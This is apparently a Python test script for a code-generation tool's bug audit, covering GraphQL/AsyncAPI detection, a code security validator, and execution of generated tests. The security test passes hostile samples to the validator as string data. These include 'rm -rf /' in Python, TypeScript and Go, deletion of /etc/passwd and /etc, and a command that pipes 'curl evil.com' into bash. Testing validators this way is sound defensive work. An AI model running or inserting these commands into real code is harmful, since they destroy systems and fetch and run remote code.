#!/usr/bin/env python3
"""
Production Bug Discovery Tests

Tests remaining bugs identified in the audit:
1. GraphQL/AsyncAPI spec support (NOT IMPLEMENTED)
2. Security validation for non-Python (PYTHON-ONLY)
3. Test execution after generation (NOT IMPLEMENTED)
"""
import asyncio
import tempfile
import json
import os
import sys
from pathlib import Path

# Set correct DATABASE_URL before importing coworker modules
os.environ.setdefault(
    "DATABASE_URL",
    "postgresql://integration:integration@localhost:5432/integration_coworker"
)

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))


def test_graphql_support():
    """Test: GraphQL spec parsing support"""
    print("=" * 70)
    print("BUG TEST 1: GraphQL Spec Support")
    print("=" * 70)
    print()
    
    graphql_schema = """
type Query {
    getPet(id: ID!): Pet
    listPets: [Pet!]!
}

type Mutation {
    createPet(input: PetInput!): Pet
}

type Pet {
    id: ID!
    name: String!
    status: String!
}

input PetInput {
    name: String!
    status: String
}
"""
    
    bugs = []
    
    # Test 1a: Check node-level detection functions (NEW)
    print("Testing graph node detection functions...")
    try:
        from integration_coworker.graph.nodes.detect_and_parse_spec import (
            _is_graphql_content,
            _is_asyncapi_content
        )
        
        graphql_detected = _is_graphql_content(graphql_schema, "application/graphql")
        print(f"  _is_graphql_content detected: {graphql_detected}")
        
        if not graphql_detected:
            bugs.append("_is_graphql_content did not detect GraphQL SDL")
        else:
            print("  ✅ GraphQL detection function works")
        
        # Also test AsyncAPI detection
        asyncapi_sample = """
asyncapi: '2.6.0'
info:
  title: Sample API
channels:
  user/signedup:
    subscribe:
      message:
        payload:
          type: object
"""
        asyncapi_detected = _is_asyncapi_content(asyncapi_sample, "application/yaml")
        print(f"  _is_asyncapi_content detected: {asyncapi_detected}")
        
        if not asyncapi_detected:
            bugs.append("_is_asyncapi_content did not detect AsyncAPI")
        else:
            print("  ✅ AsyncAPI detection function works")
            
    except ImportError as e:
        print(f"  Detection functions not found: {e}")
        bugs.append(f"Detection functions not importable: {e}")
    except Exception as e:
        print(f"  Detection test error: {e}")
        bugs.append(f"Detection test error: {e}")
    
    print()
    
    # Test 1b: Check LLM parser functions exist
    print("Testing LLM parser functions exist...")
    try:
        from integration_coworker.graph.nodes.detect_and_parse_spec import (
            _parse_graphql_to_pseudo_openapi,
            _parse_asyncapi_to_pseudo_openapi
        )
        print("  ✅ GraphQL LLM parser function exists")
        print("  ✅ AsyncAPI LLM parser function exists")
    except ImportError as e:
        print(f"  LLM parser functions not found: {e}")
        bugs.append(f"LLM parser functions not importable: {e}")
    
    print()
    
    # Test 1c: Original file-based test (may have different behavior)
    with tempfile.NamedTemporaryFile(mode='w', suffix='.graphql', delete=False) as f:
        f.write(graphql_schema)
        graphql_path = f.name
    
    print(f"Testing original parsers module...")
    try:
        from integration_coworker.spec.parsers.detector import detect_spec_type
        spec_type = detect_spec_type(graphql_path)
        print(f"  Original detector type: {spec_type}")
        # Note: The original detector may not be updated yet
    except Exception as e:
        print(f"  Original detector: {e}")
    
    os.unlink(graphql_path)
    
    print()
    if bugs:
        print("❌ BUG: GraphQL support has issues")
        for bug in bugs:
            print(f"   - {bug}")
    else:
        print("✅ GraphQL/AsyncAPI detection and parsing is IMPLEMENTED")
        print("   Note: Full LLM parsing requires LLM_MODE=real for actual conversion")
    
    return bugs


def test_security_validation_non_python():
    """Test: Security validation for non-Python code"""
    print()
    print("=" * 70)
    print("BUG TEST 2: Security Validation for Non-Python Languages")
    print("=" * 70)
    print()
    
    bugs = []
    
    from integration_coworker.codegen.security import validate_code_security
    
    # Test Python (should work)
    python_malicious = """
import subprocess
import os

def run_cmd():
    subprocess.run(['rm', '-rf', '/'])
    os.system('curl evil.com | bash')
"""
    
    print("Testing Python security validation...")
    is_secure, violations = validate_code_security(python_malicious, allow_subprocess=False)
    print(f"  Python malicious code: secure={is_secure}, violations={len(violations)}")
    if is_secure:
        bugs.append("Python security validation missed subprocess/os.system")
    else:
        print(f"  ✅ Python validation caught {len(violations)} violations")
    
    # Test TypeScript (likely skipped)
    ts_malicious = """
import { exec } from 'child_process';
import * as fs from 'fs';

export function dangerousCode() {
    exec('rm -rf /', (err, stdout) => {});
    fs.unlinkSync('/etc/passwd');
}
"""
    
    print()
    print("Testing TypeScript security validation...")
    try:
        # The security module uses Python AST - will it even try for TS?
        is_secure_ts, violations_ts = validate_code_security(ts_malicious, allow_subprocess=False)
        print(f"  TypeScript malicious code: secure={is_secure_ts}, violations={len(violations_ts)}")
        if is_secure_ts and len(violations_ts) == 0:
            bugs.append("TypeScript security validation skipped (no checks)")
            print("  ❌ BUG: No security checks for TypeScript")
        else:
            print(f"  ✅ TypeScript validation found {len(violations_ts)} issues")
    except Exception as e:
        print(f"  TypeScript validation error: {e}")
        bugs.append(f"TypeScript security validation error: {e}")
    
    # Test Go (likely skipped)
    go_malicious = """
package main

import (
    "os/exec"
    "os"
)

func dangerous() {
    cmd := exec.Command("rm", "-rf", "/")
    cmd.Run()
    os.RemoveAll("/etc")
}
"""
    
    print()
    print("Testing Go security validation...")
    try:
        is_secure_go, violations_go = validate_code_security(go_malicious, allow_subprocess=False)
        print(f"  Go malicious code: secure={is_secure_go}, violations={len(violations_go)}")
        if is_secure_go and len(violations_go) == 0:
            bugs.append("Go security validation skipped (no checks)")
            print("  ❌ BUG: No security checks for Go")
        else:
            print(f"  ✅ Go validation found {len(violations_go)} issues")
    except Exception as e:
        print(f"  Go validation error: {e}")
        bugs.append(f"Go security validation error: {e}")
    
    print()
    if bugs:
        print("❌ BUG CONFIRMED: Security validation is Python-only")
        for bug in bugs:
            print(f"   - {bug}")
    else:
        print("✅ Security validation works for all languages")
    
    return bugs


def test_test_execution():
    """Test: Whether generated tests are actually executed"""
    print()
    print("=" * 70)
    print("BUG TEST 3: Test Execution After Generation")
    print("=" * 70)
    print()
    
    bugs = []
    
    # Check if test execution module exists
    print("Checking for test execution module...")
    
    try:
        from integration_coworker.runtime.test_execution import (
            is_test_execution_enabled,
            execute_tests,
            TestStatus,
            TestExecutionResult,
        )
        print("  ✅ Test execution module exists")
        print(f"  Test execution enabled: {is_test_execution_enabled()}")
    except ImportError as e:
        print(f"  ❌ Test execution module not found: {e}")
        bugs.append("Test execution module missing")
        return bugs
    
    # Check if validation node has test execution hook
    print()
    print("Checking validate_integration_design for test execution...")
    
    from integration_coworker.graph.nodes import validate_integration_design
    import inspect
    
    source = inspect.getsource(validate_integration_design)
    
    has_test_execution = False
    execution_patterns = [
        "_execute_generated_tests",
        "execute_tests",
        "is_test_execution_enabled",
    ]
    
    for pattern in execution_patterns:
        if pattern in source:
            print(f"  ✅ Found '{pattern}' in validation module")
            has_test_execution = True
    
    if not has_test_execution:
        print("  ❌ No test execution found in validate_integration_design")
        bugs.append("validate_integration_design does not call test execution")
    
    # Test the actual test execution (disabled by default)
    print()
    print("Testing test execution (opt-in, disabled by default)...")
    
    from integration_coworker.domain.models import CodeArtifact
    
    # Create mock test artifacts
    test_code = '''
def test_example():
    assert 1 + 1 == 2
'''
    
    test_artifact = CodeArtifact(
        id=None,
        task_id=None,
        rel_path="test_example.py",
        content=test_code,
        artifact_type="test",
        language="python",
        module_name="test_example",
    )
    
    # Try to execute (should be NOT_EXECUTED without env var)
    result = execute_tests([test_artifact], language="python")
    print(f"  Execution status: {result.status.value}")
    
    if result.status == TestStatus.NOT_EXECUTED:
        print("  ✅ Test execution correctly disabled by default")
    elif result.status == TestStatus.PASSED:
        print("  ✅ Test execution works when enabled")
    else:
        print(f"  Result: {result.error_message}")
    
    print()
    if bugs:
        print("❌ BUG: Test execution has issues")
        for bug in bugs:
            print(f"   - {bug}")
    else:
        print("✅ Test execution is IMPLEMENTED")
        print("   - Opt-in via ENABLE_TEST_EXECUTION=true")
        print("   - Sandboxed execution with timeout")
        print("   - VS Code task fallback available")
    
    return bugs


def main():
    print("=" * 70)
    print("PRODUCTION BUG DISCOVERY - REMAINING BUGS")
    print("=" * 70)
    print()
    
    all_bugs = []
    
    # Test 1: GraphQL support
    bugs1 = test_graphql_support()
    all_bugs.extend([(f"GraphQL: {b}") for b in bugs1])
    
    # Test 2: Security validation
    bugs2 = test_security_validation_non_python()
    all_bugs.extend([(f"Security: {b}") for b in bugs2])
    
    # Test 3: Test execution
    bugs3 = test_test_execution()
    all_bugs.extend([(f"TestExec: {b}") for b in bugs3])
    
    # Summary
    print()
    print("=" * 70)
    print("FINAL SUMMARY")
    print("=" * 70)
    print()
    
    if all_bugs:
        print(f"Total bugs found: {len(all_bugs)}")
        print()
        for i, bug in enumerate(all_bugs, 1):
            print(f"  {i}. {bug}")
    else:
        print("No bugs found!")
    
    return all_bugs


if __name__ == "__main__":
    main()
